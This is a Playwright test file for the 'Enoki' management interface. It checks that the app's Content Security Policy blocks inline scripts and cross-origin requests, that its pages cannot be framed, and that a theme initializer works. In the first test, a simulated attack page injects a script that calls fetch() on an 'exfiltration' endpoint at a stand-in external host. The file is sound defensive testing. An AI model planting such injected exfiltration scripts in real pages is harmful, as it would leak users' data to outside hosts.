import { expect, test } from "@playwright/test";

import { monitorSecurityConsole } from "./security-console";

const managementOrigin = "http://127.0.0.1:38200";
const externalOrigin = "http://127.0.0.1:39876";

test("management CSP blocks inline script and cross-origin connections", async ({
  page,
}) => {
  const assertNoUnexpectedSecurityConsole = monitorSecurityConsole(page, [
    /Connecting to .*39876\/exfiltration.*connect-src 'self'/,
    /Fetch API cannot load .*39876\/exfiltration.*Content Security Policy/,
    /Executing inline script.*script-src 'self'/,
  ]);
  let externalRequests = 0;
  await page.route(`${externalOrigin}/**`, async (route) => {
    externalRequests += 1;
    await route.fulfill({ body: "unexpected external response", status: 200 });
  });
  await page.route("**/security-attack-runner.js", async (route) => {
    await route.fulfill({
      body: [
        "window.sameOriginScriptExecuted = true;",
        `fetch(${JSON.stringify(`${externalOrigin}/exfiltration`)}).catch(() => {});`,
      ].join("\n"),
      contentType: "text/javascript",
    });
  });
  await page.route("**/security-attack", async (route) => {
    const response = await route.fetch();
    await route.fulfill({
      body: [
        "<!doctype html><html><body>",
        '<script src="/security-attack-runner.js"></script>',
        "<script>window.inlineScriptExecuted = true;</script>",
        "</body></html>",
      ].join(""),
      response,
    });
  });

  await page.goto("/security-attack");
  await expect
    .poll(() => page.evaluate(() => window.sameOriginScriptExecuted))
    .toBe(true);
  await page.waitForTimeout(250);

  expect(
    await page.evaluate(() => window.inlineScriptExecuted),
  ).toBeUndefined();
  expect(externalRequests).toBe(0);
  assertNoUnexpectedSecurityConsole();
});

test("management documents cannot be embedded by another page", async ({
  page,
}) => {
  const assertNoUnexpectedSecurityConsole = monitorSecurityConsole(page, [
    /Framing .*127\.0\.0\.1:38200.*frame-ancestors 'none'/,
  ]);
  await page.setContent(
    `<iframe title="embedded Enoki" src="${managementOrigin}/"></iframe>`,
  );
  await page.waitForTimeout(500);

  expect(
    page.frames().some((frame) => frame.url() === `${managementOrigin}/`),
  ).toBe(false);
  assertNoUnexpectedSecurityConsole();
});

test("the external theme initializer applies the stored theme without the app bundle", async ({
  page,
}) => {
  const assertNoUnexpectedSecurityConsole = monitorSecurityConsole(page);
  await page.goto("/");
  await page.evaluate(() => localStorage.setItem("enoki-theme-mode", "dark"));
  await page.route("**/assets/index-*.js", (route) => route.abort());

  await page.reload({ waitUntil: "domcontentloaded" });

  await expect(page.locator("html")).toHaveClass(/dark/);
  await expect(page.locator("html")).toHaveCSS("color-scheme", "dark");
  assertNoUnexpectedSecurityConsole();
});

declare global {
  interface Window {
    inlineScriptExecuted?: boolean;
    sameOriginScriptExecuted?: boolean;
  }
}
